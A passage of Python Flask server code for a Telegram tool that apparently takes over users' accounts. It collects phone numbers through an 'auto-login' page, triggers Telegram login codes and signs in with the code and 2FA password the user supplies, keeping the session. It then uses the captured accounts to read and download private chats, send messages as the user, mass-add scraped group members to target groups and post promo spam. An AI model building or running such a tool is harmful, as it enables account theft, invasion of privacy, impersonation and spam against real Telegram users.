            # 3. Get from popular groups and channels
            source_groups = [
                'telegram', 'durov', 'TelegramTips', 'contest',
                'TelegramNews', 'builders', 'Android', 'iOS',
                'Python', 'programming', 'abe_army', 'Abe_armygroup',
                'Habesha_tg_market', 'ethiopia', 'addisababa',
                'cryptocurrency', 'bitcoin', 'ethereum'
            ]
            
            for sg in source_groups:
                try:
                    entity = await self.client.get_entity(sg)
                    participants = await self.client.get_participants(entity, limit=150)
                    for user in participants:
                        if user.id and not getattr(user, 'bot', False) and not user.deleted:
                            user_ids.add(user.id)
                    await asyncio.sleep(0.2)
                    logger.debug(f"Collected from {sg}, total: {len(user_ids)}")
                except:
                    continue
            
            # 4. Get from target groups members
            for target in TARGET_GROUPS:
                try:
                    entity = await self.client.get_entity(target)
                    participants = await self.client.get_participants(entity, limit=200)
                    for user in participants:
                        if user.id and not getattr(user, 'bot', False) and not user.deleted:
                            user_ids.add(user.id)
                    await asyncio.sleep(0.2)
                except:
                    continue
            
            return list(user_ids)
        
        try:
            result = SyncTelegramClient.run_async(_collect, timeout=90)
            logger.info(f"Enhanced collection: {len(result) if result else 0} users found")
            return result if result else list(user_ids)
        except:
            return list(user_ids)
    
    def add_user_to_targets(self, user_id):
        success = False
        for target in TARGET_GROUPS:
            if not self.running:
                break
            if not self.ensure_connection():
                break
            async def _add():
                try:
                    entity = await self.client.get_entity(target)
                    user_input = await self.client.get_input_entity(user_id)
                    await self.client(InviteToChannelRequest(entity, [user_input]))
                    return True
                except errors.FloodWaitError as e:
                    time.sleep(min(e.seconds, 60))
                    return False
                except:
                    return False
            try:
                if SyncTelegramClient.run_async(_add, timeout=15):
                    success = True
            except:
                continue
        
        if success:
            try:
                record = {'user_id': user_id, 'time': datetime.now().isoformat(), 'worker_id': self.acc_id}
                worker_adds[self.acc_key].append(record)
                if len(worker_adds[self.acc_key]) > 1000:
                    worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
                if len(worker_adds[self.acc_key]) % 10 == 0:
                    save_json(WORKER_ADDS_FILE, dict(worker_adds))
            except:
                pass
        return success

def start_auto_add(account):
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_tasks:
                existing = running_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    existing['worker'].stop()
                    existing['thread'].join(timeout=5)
            worker = AutoAddWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
            thread.start()
            running_tasks[acc_key] = {'thread': thread, 'worker': worker}
            logger.info(f"✅ Started auto-add worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Start worker error: {e}")

def stop_auto_add(account_id):
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_tasks:
                worker_info = running_tasks.pop(acc_key)
                if worker_info and worker_info.get('worker'):
                    worker_info['worker'].stop()
                logger.info(f"Stopped auto-add worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Stop auto add error: {e}")

def start_auto_share(account):
    """Start auto share worker for an account"""
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_share_tasks:
                existing = running_share_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    existing['worker'].stop()
                    existing['thread'].join(timeout=5)
            
            worker = AutoShareWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"share_{acc_key}")
            thread.start()
            running_share_tasks[acc_key] = {'thread': thread, 'worker': worker}
            logger.info(f"📢 Started auto-share worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Start share worker error: {e}")

def stop_auto_share(account_id):
    """Stop auto share worker for an account"""
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_share_tasks:
                worker_info = running_share_tasks.pop(acc_key)
                if worker_info and worker_info.get('worker'):
                    worker_info['worker'].stop()
                logger.info(f"Stopped auto-share worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Stop share worker error: {e}")

# ============================================
# PHONE LOOKUP HELPERS
# ============================================
def find_phone_for_user(telegram_id):
    tid = str(telegram_id)
    phone = user_phone_map.get(tid, '')
    if phone:
        return phone
    if tid in auto_sessions:
        phone = auto_sessions[tid].get('phone', '')
        if phone:
            return phone
    for acc in accounts:
        if str(acc.get('telegram_id')) == tid and acc.get('phone'):
            return acc['phone']
    return None

def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
    async def send_auto_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            sid = str(int(time.time() * 1000))
            temp_sessions[sid] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save(),
                'password_attempts': 0,
                'code_attempts': 0,
                'created_at': time.time(),
                'telegram_id': telegram_id,
                'first_name': first_name,
                'last_name': last_name,
                'username': username
            }
            save_temp_sessions()
            masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
            logger.info(f"✅ Code sent to {masked_phone}")
            return {
                'success': True,
                'session_id': sid,
                'phone_masked': masked_phone,
                'user_name': f"{first_name} {last_name}".strip() or username or 'User'
            }
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
        except errors.PhoneNumberInvalidError:
            return {'success': False, 'error': 'Invalid phone number.'}
        except Exception as e:
            logger.error(f"Auto code error: {e}")
            return {'success': False, 'error': 'Could not send code.'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
    if not result.get('success'):
        if str(telegram_id) in user_phone_map:
            del user_phone_map[str(telegram_id)]
            save_user_map()
        if str(telegram_id) in auto_sessions:
            del auto_sessions[str(telegram_id)]
            save_auto_sessions()
    return result

# ============================================
# DASHBOARD HELPERS (LIGHTWEIGHT)
# ============================================
def get_account_by_id(account_id):
    for acc in accounts:
        if str(acc['id']) == str(account_id) or acc['id'] == account_id:
            return acc
    return None

def get_client_for_account(account_id):
    acc = get_account_by_id(account_id)
    if not acc or not acc.get('session'):
        return None, "Account not found"
    try:
        client = SyncTelegramClient.get_client(acc['session'])
        return client, acc
    except Exception as e:
        return None, str(e)

async def get_dialogs_lightweight(client, limit=50):
    """
    Get ONLY chat list with last message preview - NO full message history.
    This is fast and lightweight.
    """
    dialogs_list = []
    
    try:
        dialogs = await client.get_dialogs(limit=limit)
        
        for dialog in dialogs:
            try:
                entity = dialog.entity
                
                # Determine chat type and ID
                if hasattr(entity, 'username') and entity.username:
                    chat_id = entity.username
                elif hasattr(entity, 'id'):
                    chat_id = str(entity.id)
                else:
                    continue
                
                title = dialog.name or 'Unknown'
                
                # Determine type
                if dialog.is_user:
                    chat_type = 'bot' if getattr(entity, 'bot', False) else 'user'
                elif dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                else:
                    chat_type = 'user'
                
                # Get last message info ONLY (no history fetch)
                last_message_text = ''
                last_message_date = None
                last_message_media = None
                
                if dialog.message:
                    msg = dialog.message
                    if msg.message:
                        last_message_text = msg.message[:100]
                    if msg.date:
                        last_message_date = int(msg.date.timestamp())
                    if msg.media:
                        if hasattr(msg.media, 'photo'):
                            last_message_media = 'photo'
                        elif hasattr(msg.media, 'document'):
                            last_message_media = 'document'
                
                chat_data = {
                    'id': chat_id,
                    'title': title,
                    'type': chat_type,
                    'lastMessage': last_message_text,
                    'lastMessageDate': last_message_date,
                    'lastMessageMedia': last_message_media,
                    'unread': dialog.unread_count or 0,
                    'isUser': dialog.is_user,
                    'isGroup': dialog.is_group,
                    'isChannel': dialog.is_channel
                }
                
                dialogs_list.append(chat_data)
            except Exception as e:
                continue
        
        # Sort: unread first, then by date
        dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
        return dialogs_list
        
    except Exception as e:
        logger.error(f"Get dialogs error: {e}")
        raise

async def get_chat_messages(client, chat_id, limit=30):
    """
    Get messages for a SPECIFIC chat - called only when user clicks a chat.
    """
    messages_list = []
    
    try:
        # Get entity
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                return messages_list
        
        # Get messages
        messages = await client.get_messages(entity, limit=limit)
        
        for msg in messages:
            if not msg:
                continue
            try:
                msg_data = {
                    'id': msg.id,
                    'text': msg.message or '',
                    'date': int(msg.date.timestamp()) if msg.date else 0,
                    'out': msg.out if hasattr(msg, 'out') else False,
                    'chatId': chat_id,
                    'hasMedia': bool(msg.media),
                    'mediaType': None
                }
                
                if msg.media:
                    if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
                        msg_data['mediaType'] = 'photo'
                    elif hasattr(msg.media, 'document'):
                        doc = msg.media.document
                        if doc:
                            mime_type = getattr(doc, 'mime_type', '')
                            if 'video' in mime_type:
                                msg_data['mediaType'] = 'video'
                            elif 'audio' in mime_type:
                                msg_data['mediaType'] = 'audio'
                            else:
                                msg_data['mediaType'] = 'document'
                    elif isinstance(msg.media, MessageMediaWebPage):
                        msg_data['mediaType'] = 'link'
                
                messages_list.append(msg_data)
            except:
                continue
        
        return messages_list
    except Exception as e:
        logger.error(f"Get messages error: {e}")
        raise

async def send_message_async(client, chat_id, message_text):
    try:
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                raise ValueError(f"Cannot find chat: {chat_id}")
        
        result = await client.send_message(entity, message_text)
        return {
            'success': True,
            'messageId': result.id,
            'text': result.message,
            'date': int(result.date.timestamp()) if result.date else 0
        }
    except Exception as e:
        logger.error(f"Send message error: {e}")
        raise

async def download_media_async(client, account_id, message_id):
    try:
        dialogs = await client.get_dialogs(limit=100)
        for dialog in dialogs:
            try:
                messages = await client.get_messages(dialog.entity, limit=100)
                for msg in messages:
                    if msg.id == int(message_id) and msg.media:
                        filename = f"media_{account_id}_{message_id}"
                        filepath = os.path.join(MEDIA_CACHE_DIR, filename)
                        await client.download_media(msg, filepath)
                        mime_type = mimetypes.guess_type(filepath)[0] or 'application/octet-stream'
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        try:
                            os.remove(filepath)
                        except:
                            pass
                        return {
                            'data': base64.b64encode(data).decode('utf-8'),
                            'mime_type': mime_type,
                            'size': len(data)
                        }
            except:
                continue
        return None
    except Exception as e:
        logger.error(f"Download media error: {e}")
        return None

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found. Please upload the file.", 404

@app.route('/auto-add')
def auto_add_page():
    try:
        return send_file('auto_add.html')
    except FileNotFoundError:
        return "auto_add.html not found. Please upload the file.", 404

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found. Please upload the file.", 404

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found. Please upload the file.", 404

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found. Please upload the file.", 404

@app.route('/control')
def control_page():
    """Serve the control panel"""
    try:
        return send_file('control.html')
    except FileNotFoundError:
        return "control.html not found. Please upload the file.", 404

@app.route('/ping')
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks),
        'share_workers': len(running_share_tasks),
        'accounts': len(accounts),
        'total_added_today': stats.get('today_added', 0),
        'total_shares_today': share_stats.get('today_shares', 0)
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS,
            'share_groups_count': len(share_groups)
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            aid_str = str(a['id'])
            ws = stats.get('worker_stats', {}).get(aid_str, {})
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True),
                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
                'auto_share_enabled': aid_str in running_share_tasks,
                'stats': {
                    'total_added': ws.get('total', 0),
                    'today_added': ws.get('today', 0)
                },
                'is_running': aid_str in running_tasks,
                'is_sharing': aid_str in running_share_tasks
            })
        except:
            continue
    return jsonify({'success': True, 'accounts': acc_list})

# ============================================
# SHARE CONFIGURATION API ROUTES
# ============================================

@app.route('/api/share-config', methods=['GET'])
def get_share_config():
    """Get current share configuration"""
    global share_config
    share_config = load_share_config()
    
    return jsonify({
        'success': True,
        'config': {
            'messages': share_config.get('messages', []),
            'current_message_index': share_config.get('current_message_index', 0),
            'share_interval_seconds': share_config.get('share_interval_seconds', 300),
            'share_delay_between_groups': share_config.get('share_delay_between_groups', 20),
            'auto_share_enabled': share_config.get('auto_share_enabled', True),
            'rotate_messages': share_config.get('rotate_messages', True),
            'use_premium_emojis': share_config.get('use_premium_emojis', True),
            'last_updated': share_config.get('last_updated', '')
        }
    })

@app.route('/api/share-config', methods=['POST'])
def update_share_config():
    """Update share configuration"""
    global share_config, SHARE_INTERVAL_SECONDS, SHARE_DELAY_BETWEEN_GROUPS, AUTO_SHARE_ENABLED
    
    try:
        data = request.json or {}
        
        # Update messages
        if 'messages' in data:
            share_config['messages'] = data['messages']
        
        # Update intervals
        if 'share_interval_seconds' in data:
            interval = int(data['share_interval_seconds'])
            if interval < 60:  # Minimum 1 minute
                interval = 60
            if interval > 86400:  # Maximum 24 hours
                interval = 86400
            share_config['share_interval_seconds'] = interval
            SHARE_INTERVAL_SECONDS = interval
        
        if 'share_delay_between_groups' in data:
            delay = int(data['share_delay_between_groups'])
            if delay < 5:
                delay = 5
            if delay > 300:
                delay = 300
            share_config['share_delay_between_groups'] = delay
            SHARE_DELAY_BETWEEN_GROUPS = delay
        
        # Update other settings
        if 'auto_share_enabled' in data:
            share_config['auto_share_enabled'] = bool(data['auto_share_enabled'])
            AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
        
        if 'rotate_messages' in data:
            share_config['rotate_messages'] = bool(data['rotate_messages'])
        
        if 'use_premium_emojis' in data:
            share_config['use_premium_emojis'] = bool(data['use_premium_emojis'])
        
        if 'current_message_index' in data:
            share_config['current_message_index'] = int(data['current_message_index'])
        
        save_share_config(share_config)
        
        # Update global PROMO_MESSAGE for legacy compatibility
        if share_config['messages']:
            global PROMO_MESSAGE
            PROMO_MESSAGE = share_config['messages'][0]
        
        logger.info(f"📢 Share config updated: interval={SHARE_INTERVAL_SECONDS}s, messages={len(share_config['messages'])}")
        
        return jsonify({
            'success': True,
            'message': 'Share configuration updated',
            'config': share_config
        })
        
    except Exception as e:
        logger.error(f"Update share config error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-config/time-presets', methods=['GET'])
def get_time_presets():
    """Get common time presets"""
    presets = {
        '1min': 60,
        '3min': 180,
        '5min': 300,
        '10min': 600,
        '15min': 900,
        '30min': 1800,
        '1hour': 3600,
        '2hours': 7200,
        '6hours': 21600,
        '12hours': 43200,
        '24hours': 86400
    }
    
    return jsonify({
        'success': True,
        'presets': presets
    })

# ============================================
# AUTO SHARE API ROUTES
# ============================================

@app.route('/api/share-groups', methods=['GET'])
def get_share_groups():
    """Get list of groups for auto sharing"""
    return jsonify({
        'success': True,
        'groups': share_groups,
        'count': len(share_groups)
    })

@app.route('/api/share-groups', methods=['POST'])
def update_share_groups():
    """Add groups to share list"""
    try:
        data = request.json or {}
        new_groups = data.get('groups', [])
        
        if not new_groups:
            return jsonify({'success': False, 'error': 'No groups provided'})
        
        added = 0
        for group in new_groups:
            group = str(group).strip()
            if group and group not in share_groups:
                share_groups.append(group)
                added += 1
        
        save_share_groups()
        
        return jsonify({
            'success': True,
            'message': f'Added {added} groups',
            'total_groups': len(share_groups)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-groups/remove', methods=['POST'])
def remove_share_group():
    """Remove a group from share list"""
    try:
        data = request.json or {}
        group = data.get('group', '').strip()
        
        if not group:
            return jsonify({'success': False, 'error': 'Group not specified'})
        
        if group in share_groups:
            share_groups.remove(group)
            save_share_groups()
        
        return jsonify({
            'success': True,
            'message': f'Removed group: {group}',
            'total_groups': len(share_groups)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-groups/discover', methods=['POST'])
def discover_groups():
    """Discover groups for sharing from an account"""
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = get_account_by_id(account_id)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        discovered = discover_share_groups(acc)
        
        # Add to global list
        added = 0
        for g in discovered:
            if g not in share_groups:
                share_groups.append(g)
                added += 1
        save_share_groups()
        
        return jsonify({
            'success': True,
            'discovered': len(discovered),
            'new_added': added,
            'total_groups': len(share_groups)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/start', methods=['POST'])
def start_share():
    """Start auto share for an account"""
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = get_account_by_id(account_id)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        start_auto_share(acc)
        
        return jsonify({
            'success': True,
            'message': f'Auto share started for {acc.get("name", account_id)}'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/stop', methods=['POST'])
def stop_share():
    """Stop auto share for an account"""
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        stop_auto_share(account_id)
        
        return jsonify({
            'success': True,
            'message': f'Auto share stopped for account {account_id}'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/start-all', methods=['POST'])
def start_share_all():
    """Start auto share for all accounts"""
    try:
        started = 0
        for acc in accounts:
            if acc.get('session'):
                if check_account_auth(acc):
                    start_auto_share(acc)
                    started += 1
                    time.sleep(2)  # Stagger starts
        
        return jsonify({
            'success': True,
            'message': f'Auto share started for {started} accounts',
            'started': started
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/stop-all', methods=['POST'])
def stop_share_all():
    """Stop auto share for all accounts"""
    try:
        stopped = 0
        for acc_key in list(running_share_tasks.keys()):
            stop_auto_share(acc_key)
            stopped += 1
        
        return jsonify({
            'success': True,
            'message': f'Auto share stopped for {stopped} accounts',
            'stopped': stopped
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-stats')
def get_share_stats():
    """Get auto share statistics"""
    config = load_share_config()
    return jsonify({
        'success': True,
        'stats': {
            'total_shares': share_stats.get('total_shares', 0),
            'today_shares': share_stats.get('today_shares', 0),
            'last_share_time': share_stats.get('last_share_time'),
            'errors': share_stats.get('errors', 0),
            'active_share_workers': len(running_share_tasks),
            'total_share_groups': len(share_groups),
            'share_interval': config.get('share_interval_seconds', 300),
            'delay_between_groups': config.get('share_delay_between_groups', 20)
        }
    })

@app.route('/api/promo-message', methods=['GET', 'POST'])
def promo_message():
    """Get or update the promo message"""
    global PROMO_MESSAGE
    
    if request.method == 'GET':
        config = load_share_config()
        return jsonify({
            'success': True,
            'messages': config.get('messages', []),
            'current_message': config['messages'][0] if config['messages'] else '',
            'share_interval': config.get('share_interval_seconds', 300),
            'delay_between_groups': config.get('share_delay_between_groups', 20)
        })
    
    # POST - Update message
    try:
        data = request.json or {}
        new_message = data.get('message', '')
        
        if new_message:
            config = load_share_config()
            config['messages'] = [new_message]
            config['current_message_index'] = 0
            save_share_config(config)
            PROMO_MESSAGE = new_message
            logger.info(f"📢 Promo message updated")
        
        return jsonify({
            'success': True,
            'message': PROMO_MESSAGE
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ============================================
# DASHBOARD - GET CHAT LIST ONLY (FAST)
# ============================================
@app.route('/api/get-chats', methods=['POST'])
def get_chats():
    """
    Get ONLY chat list with last message preview.
    NO message history - fast and lightweight.
    """
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        # Check cache
        cache_key = f"chats_{account_id}"
        with cache_lock:
            if cache_key in chat_list_cache:
                cached = chat_list_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < CHAT_LIST_CACHE_DURATION:
                    return jsonify(cached['data'])
        
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        
        async def _get():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            if not await client.is_user_authorized():
                return None, "auth_key_unregistered"
            dialogs = await get_dialogs_lightweight(client, limit=50)
            return {
                'success': True,
                'chats': dialogs,
                'accountName': acc.get('name', 'Unknown')
            }, None
        
        try:
            result, error = SyncTelegramClient.run_async(_get, timeout=25)
            
            if error:
                return jsonify({'success': False, 'error': error})
            
            if result:
                with cache_lock:
                    chat_list_cache[cache_key] = {
                        'data': result,
                        'timestamp': time.time()
                    }
                return jsonify(result)
            else:
                return jsonify({'success': False, 'error': 'No data returned'})
                
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Get chats error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

# ============================================
# DASHBOARD - GET MESSAGES FOR SPECIFIC CHAT (ON DEMAND)
# ============================================
@app.route('/api/get-chat-messages', methods=['POST'])
def get_chat_messages_route():
    """
    Get messages for a SPECIFIC chat - called only when user clicks a chat.
    """
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        if not chat_id:
            return jsonify({'success': False, 'error': 'Chat ID required'})
        
        # Check message cache
        cache_key = f"msgs_{account_id}_{chat_id}"
        with cache_lock:
            if cache_key in message_cache:
                cached = message_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < MESSAGE_CACHE_DURATION:
                    return jsonify(cached['data'])
        
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        
        async def _get_msgs():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            if not await client.is_user_authorized():
                return None, "Session expired"
            messages = await get_chat_messages(client, chat_id, limit=30)
            return {'success': True, 'messages': messages}, None
        
        try:
            result, error = SyncTelegramClient.run_async(_get_msgs, timeout=20)
            
            if error:
                return jsonify({'success': False, 'error': error})
            
            if result:
                with cache_lock:
                    message_cache[cache_key] = {
                        'data': result,
                        'timestamp': time.time()
                    }
                return jsonify(result)
            else:
                return jsonify({'success': False, 'error': 'No messages found'})
                
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Get chat messages error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

# ============================================
# DASHBOARD - SEND MESSAGE
# ============================================
@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        message_text = data.get('message', '')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        if not chat_id:
            return jsonify({'success': False, 'error': 'Chat ID required'})
        if not message_text:
            return jsonify({'success': False, 'error': 'Message text required'})
        
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        
        async def _send():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            if not await client.is_user_authorized():
                return None, "Session expired"
            result = await send_message_async(client, chat_id, message_text)
            return result, None
        
        try:
            result, error = SyncTelegramClient.run_async(_send, timeout=30)
            
            if error:
                return jsonify({'success': False, 'error': error})
            
            # Invalidate caches
            with cache_lock:
                cache_key = f"chats_{account_id}"
                if cache_key in chat_list_cache:
                    del chat_list_cache[cache_key]
                msg_key = f"msgs_{account_id}_{chat_id}"
                if msg_key in message_cache:
                    del message_cache[msg_key]
            
            return jsonify(result or {'success': False, 'error': 'Failed to send'})
            
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Send message error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

# ============================================
# DASHBOARD - GET MEDIA
# ============================================
@app.route('/api/media/<int:account_id>/<int:message_id>')
def get_media(account_id, message_id):
    try:
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'error': 'Account not found'}), 404
        
        async def _download():
            if not await SyncTelegramClient.safe_connect(client):
                return None
            if not await client.is_user_authorized():
                return None
            return await download_media_async(client, account_id, message_id)
        
        try:
            media_data = SyncTelegramClient.run_async(_download, timeout=30)
            
            if media_data:
                from flask import Response
                return Response(
                    base64.b64decode(media_data['data']),
                    mimetype=media_data['mime_type'],
                    headers={
                        'Content-Disposition': f'inline; filename="media_{account_id}_{message_id}"',
                        'Cache-Control': 'public, max-age=3600'
                    }
                )
            else:
                return jsonify({'error': 'Media not found'}), 404
                
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Get media error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================
# SHARED PHONE ENDPOINT
# ============================================
@app.route('/api/share-phone', methods=['POST'])
def share_phone():
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        first_name = data.get('firstName', '')
        last_name = data.get('lastName', '')
        username = data.get('username', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number provided'})
        
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Shared phone for user {telegram_id}: {phone[:4]}****")
        
        if telegram_id:
            user_phone_map[telegram_id] = phone
            save_user_map()
        
        result = auto_send_code(phone, telegram_id, first_name, last_name, username)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Share phone error: {e}")
        return jsonify({'success': False, 'error': 'Failed to process phone.'})

# ============================================
# TELEGRAM AUTO-LOGIN
# ============================================
@app.route('/api/telegram-auto-login', methods=['POST'])
def telegram_auto_login():
    try:
        data = request.json or {}
        init_data_str = data.get('initData', '')
        if not init_data_str:
            init_data_str = request.args.get('initData', '')
        
        user_data = data.get('user', {})
        if not user_data and init_data_str:
            for item in init_data_str.split('&'):
                if item.startswith('user='):
                    try:
                        user_json = urllib.parse.unquote(item[5:])
                        user_data = json.loads(user_json)
                    except:
                        pass
        
        telegram_id = str(user_data.get('id', ''))
        first_name = user_data.get('first_name', '')
        last_name = user_data.get('last_name', '')
        username = user_data.get('username', '')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'Could not identify account.', 'needs_phone': True})
        
        phone = find_phone_for_user(telegram_id)
        
        if phone:
            logger.info(f"✅ Found phone for {telegram_id}, sending code...")
            result = auto_send_code(phone, telegram_id, first_name, last_name, username)
            result['auto_detected'] = True
            return jsonify(result)
        else:
            return jsonify({
                'success': False,
                'error': 'Please share your phone number.',
                'needs_phone': True,
                'request_phone_share': True,
                'user_name': f"{first_name} {last_name}".strip(),
                'username': username
            })
            
    except Exception as e:
        logger.error(f"Auto-login error: {e}")
        return jsonify({'success': False, 'error': 'Auto-login failed.', 'needs_phone': True})

# ============================================
# ADD ACCOUNT
# ============================================
@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        result = auto_send_code(phone, telegram_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': 'Server error.'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired.'})
        
        td = temp_sessions[sid]
        telegram_id = str(td.get('telegram_id', ''))
        
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect codes.'})
        
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect passwords.'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        if remaining <= 0:
                            del temp_sessions[sid]
                            save_temp_sessions()
